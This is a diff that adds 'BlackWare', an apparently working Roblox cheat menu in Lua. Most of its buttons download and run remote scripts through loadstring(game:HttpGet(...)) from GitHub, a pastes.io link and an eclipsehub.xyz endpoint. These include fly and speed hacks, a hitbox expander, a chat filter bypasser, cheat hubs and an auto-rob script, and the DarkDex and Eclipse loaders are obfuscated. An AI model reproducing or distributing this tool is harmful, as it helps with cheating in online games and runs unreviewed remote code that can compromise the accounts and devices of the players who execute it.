@@ -1,0 +1,87 @@
+local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+local window = DrRayLibrary:Load("BlackWare | Beta", "Default")
+
+local tab = DrRayLibrary.newTab("Universal", "ImageIdHere")
+
+tab.newButton("WalkspeedV1", "Make your walk speed 100", function()
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
+end)
+
+tab.newButton("Jumppowerv1", "Make your JumpPower 100", function()
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100
+end)
+
+tab.newSlider("WalkspeedV2", "Adjustable", 100, false, function(num)
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (num)
+end)
+
+tab.newSlider("JumpPowerV2", "Adjustable", 500, false, function(num)
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = (num)
+end)
+
+tab.newButton("WalkspeedRecover", "Make your walk speed 16(default)", function()
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
+end)
+
+tab.newButton("JumpPowerRecover", "Make your JumpPower 50(default)", function()
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
+end)
+
+local tab = DrRayLibrary.newTab("Common Hacks", "ImageIdHere")
+
+tab.newButton("Fly Gui v3", "Make you fly fast (adjustable)", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
+end)
+
+tab.newButton("Infinite Yield","A powerful yet simple admin panel", function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+end)
+
+tab.newButton("Hitbox Expander","Make everyone easier to hit except you", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/HitboxExpander.lua"))()
+end)
+
+tab.newButton("Chat Bypasser","Say whatever you want(credits to jxyserr)", function()
+loadstring(game:HttpGet('https://pastes.io/raw/lstrrfipqq'))();
+end)
+
+tab.newButton("Mobile Keyboard", "This script gives you a virtual working keyboard", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+end)
+
+tab.newButton("Auto Piano", "Automatically Plays Song on roblox default keyboards", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Madness676/3.2Lol/main/AutoPiano3-2.lua", true))()
+end)
+
+tab.newButton("DarkDex", "Allow you to view and modify client side assets", function()
+if game:GetService'CoreGui':FindFirstChild'Dex'then game:GetService'CoreGui'.Dex:Destroy()end;math.randomseed(tick())local a={}for b=48,57 do table.insert(a,string.char(b))end;for b=65,90 do table.insert(a,string.char(b))end;for b=97,122 do table.insert(a,string.char(b))end;function RandomCharacters(c)if c>0 then return RandomCharacters(c-1)..a[math.random(1,#a)]else return''end end;local d=game:GetObjects('rbxassetid://3567096419')[1]d.Name=RandomCharacters(math.random(5,20))d.Parent=game:GetService('CoreGui')local function e(f,g)local function h(i,j)local k={}local l={script=j}local m={}m.__index=function(n,o)if l[o]==nil then return getfenv()[o]else return l[o]end end;m.__newindex=function(n,o,p)if l[o]==nil then getfenv()[o]=p else l[o]=p end end;setmetatable(k,m)setfenv(i,k)return i end;local function q(j)if j.ClassName=='Script'or j.ClassName=='LocalScript'then spawn(function()h(loadstring(j.Source,'='..j:GetFullName()),j)()end)end;for b,r in pairs(j:GetChildren())do q(r)end end;q(f)end;e(d)
+end)
+local tab = DrRayLibrary.newTab("Game Hubs", "ImageIdHere")
+
+tab.newButton("Bedol Hub", "Good For Blade Ball", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/Loaders/main/Blade_Ball.lua"))()
+end)
+
+tab.newButton("NukeVsCityHub", "Supports 70+ Popular games (discontinued)", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NukeVsCity/TheALLHACKLoader/main/NukeLoader"))()
+end)
+
+tab.newButton("Eclipse Hub", "Support 10+ games", function()
+getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+end)
+
+tab.newButton("Hoho Hub","Best in Blox Fruits(Key Required)", function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
+end)
+
+tab.newButton("Sr.LdsHub","Support games such as cc2,toh,p99,and more", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/limaspeedy/limaspeedy/main/HubLDS"))()
+end)
+
+local tab = DrRayLibrary.newTab("Random Scripts", "ImageIdHere")
+
+tab.newButton("ProjectAutoJailbreakAutoRob","The best autorob ever", function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pxsta72/ProjectAuto/main/AutoRobV4Release"))()
+end)
